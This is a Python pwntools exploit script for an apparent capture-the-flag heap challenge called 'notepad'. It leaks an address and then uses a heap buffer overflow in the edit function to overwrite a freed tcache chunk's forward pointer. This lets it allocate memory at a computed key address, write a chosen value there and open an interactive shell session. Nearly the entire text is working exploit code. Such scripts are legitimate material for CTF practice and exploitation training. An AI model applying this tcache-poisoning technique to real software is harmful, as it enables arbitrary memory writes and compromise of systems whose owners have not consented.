import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chal'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='notepad.ctf.intigriti.io 1341', pie_base=0x555555400000)

def create(index, size, data):
    r.sla(b'> ', b'1')
    r.sla(b'> ', str(index).encode())
    r.sla(b'> ', str(size).encode())
    r.sa(b'> ', data)

def view(index):
    r.sla(b'> ', b'2')
    r.sla(b'> ', str(index).encode())

def edit(index, data):
    r.sla(b'> ', b'3')
    r.sla(b'> ', str(index).encode())
    r.sa(b'> ', data)

def remove(index):
    r.sla(b'> ', b'4')
    r.sla(b'> ', str(index).encode())


r.ru(b'gift: 0x')
_l = r.rl().strip().decode()
main_leak = int(_l, 16)
key = main_leak + 0x200eb2
log.info('Main leak: ' + hex(main_leak))
log.info('Key leak: ' + hex(key))

# Free chunk 1, it'll be placed in tcachebin and FD is set
create(0, 8, b'aaaa')
create(1, 8, b'bbbb')
remove(1)

# Edit note has heap buffer overflow, write over chunk 1's FD pointer
pay = b'A' * (8*3)
pay += p64(0x21)
pay += p64(key)
edit(0, pay)

# tcachebin: chunk 1 -> key
create(2, 8, b'cccc')
# tcachebin: key
create(4, 8, p64(0xcafebabe))
# key = 0xcafebabe

r.sla(b'> ', b'5')

r.interactive()